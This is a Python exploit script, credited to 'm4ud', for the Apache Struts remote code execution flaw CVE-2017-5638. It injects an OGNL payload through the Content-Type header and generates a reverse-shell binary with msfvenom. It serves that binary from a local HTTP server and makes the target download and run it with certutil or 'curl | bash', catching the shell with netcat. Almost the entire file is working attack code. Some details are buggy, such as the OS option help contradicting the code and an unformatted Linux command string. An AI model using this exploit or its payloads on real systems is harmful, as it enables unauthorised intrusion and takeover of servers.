# Author (m4ud)
# Apache Struts-045
# CVE : 2017-5638

import sys
import requests
from optparse import OptionParser
import os
import subprocess
import http.server
import threading
import time


def serverShutdown(server):
	server.stop()
	print("Shutting Server down!")


class AS045:
	def __init__(self, options):
		self.target = options.target
		self.directory = options.directory
		self.command = options.command
		self.rport = options.rport
		self.osys = options.osys
		self.lport = options.lport
		self.lhost = options.lhost
		self.wport = options.wport


		if(len(sys.argv) < 3):
			print('\n python3 exploit.py -h   ...for help')
			print('\n Usage : exploit.py RHOST RPORT Struts-directory cmd')

		else:
			def wshell(shell):
				f = open( 'shelb', 'w' )
				f.write(shell)
				f.close()
				print("\r\n[+] Initiating Omega Protocol [+]")

			def venom(shell, ext):
				os.system("msfvenom -p "+ shell + "/shell_reverse_tcp LHOST=" + self.lhost+ " LPORT="+ str(self.lport) + " -f "+ ext+ " > shelb")

			print("\r\n[+] (m4ud) AS-045 RCE [+]\r\n")
			print("[+] Serving Payload at port " + str(self.wport) +" [+]\r\n")
			server_address = (self.lhost, int(self.wport))
			self.httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
			self.server_thread = threading.Thread(target=self.httpd.serve_forever).start()

			def stop(self):
				print("\r\n[+] Shutting Server down! [+]\r\n")
				self.httpd.shutdown()
				self.httpd.server_close()

#			proxies='http://127.0.0.1:8080'
#			proxies = {'http' : proxies}
			target = 'http://' + self.target #Vulnerable Server
			port = self.rport
			directory = self.directory # Struts Application directory
			cmd = self.command

			if self.osys == "1":
				shell = "windows"
				ext = "exe"
				venom(shell, ext)
				os.system('mv shelb shelb.exe')
				cmd = "certutil -urlcache -f -split http://%s:%s/shelb.exe & shelb.exe" % (self.lhost, self.wport)

			if self.osys == "2":
				shell = "linux"
				ext = "elf"
				venom(shell, ext)
				cmd = "curl http://%s/shelb |bash"

			URL = target + ':' + port + '/' + directory + '/'

			payload = "%{(#_='multipart/form-data')."
			payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
			payload += "(#_memberAccess?"
			payload += "(#_memberAccess=#dm):"
			payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
			payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
			payload += "(#ognlUtil.getExcludedPackageNames().clear())."
			payload += "(#ognlUtil.getExcludedClasses().clear())."
			payload += "(#context.setMemberAccess(#dm))))."
			payload += "(#cmd='%s')." % cmd
			payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
			payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
			payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
			payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
			payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
			payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
			payload += "(#ros.flush())}"

			headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}

			f = subprocess.Popen(["nc", "-lvnp", str(self.lport)])
			r = requests.get(URL, headers=headers)
			stop(self)
			f.communicate()


def main():
	parser = OptionParser()
	parser.add_option("-p", "--port", dest="rport", help="RPORT, ")
	parser.add_option("-t", "--target", dest="target", help="Vulnerable Target, ")
	parser.add_option("-d", "--dir", dest="directory",default='struts2-rest-showcase', help="Struts Application directory, ")
	parser.add_option("-c", "--command", dest="command", help="System Command, ")
	parser.add_option("-o", "--os", dest="osys", help="Choose OS: Linux = 1, Windows = 2")
	parser.add_option("-l", "--lhost", dest="lhost", help="LHOST")
	parser.add_option("-P", "--lport", dest="lport",default=443 ,help="LPORT")
	parser.add_option("-w", "--wport", dest="wport", default=4443, help="WPORT")
	(options, args) = parser.parse_args() 
	exploit = AS045(options) 

if __name__=="__main__": 
	main()

